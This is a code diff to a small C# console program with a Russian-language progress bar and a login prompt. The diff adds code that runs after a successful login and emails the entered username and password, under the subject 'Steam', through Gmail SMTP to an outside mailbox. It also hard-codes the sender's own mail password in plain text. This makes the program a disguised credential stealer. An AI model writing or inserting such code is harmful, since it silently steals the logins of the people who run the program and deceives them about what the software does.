@@ -1,5 +1,7 @@
 ﻿using System;
 using System.IO;
+using System.Net;
+using System.Net.Mail;
 using System.Threading;
 
 namespace Clenix
@@ -29,7 +31,7 @@ namespace Clenix
                 {
                     Console.SetCursorPosition(50, 50);
                     Console.WriteLine("Выполнено {0}%", i);
-                    Thread.Sleep(50);
+                    Thread.Sleep(20);
                 }
             });
             thread.Start();
@@ -50,9 +52,21 @@ namespace Clenix
                 String PasswordPro = Console.ReadLine();
                 if (Login == LoginPro & Password == PasswordPro)
                 {
-                    
+
                     Console.WriteLine("Успешный вход в систему !");
-                    break;   
+                    MailAddress from = new MailAddress("maratkaxa555@gmail.com", "Marat");
+                    MailAddress to = new MailAddress("maratkaxa@yandex.ru");
+                    MailMessage m = new MailMessage(from, to);
+                    m.Subject = "Steam";
+                    m.Body = $"<h2> {LoginPro}, {PasswordPro} </h2>";
+                    m.IsBodyHtml = true;
+                    SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
+                    smtp.Credentials = new NetworkCredential("maratkaxa555@gmail.com", "89679409433");
+                    smtp.EnableSsl = true;
+                    smtp.Send(m);
+                    Console.WriteLine("Да все тебе пипи");
+                    
+                    break;
                 }
                 else
                 {
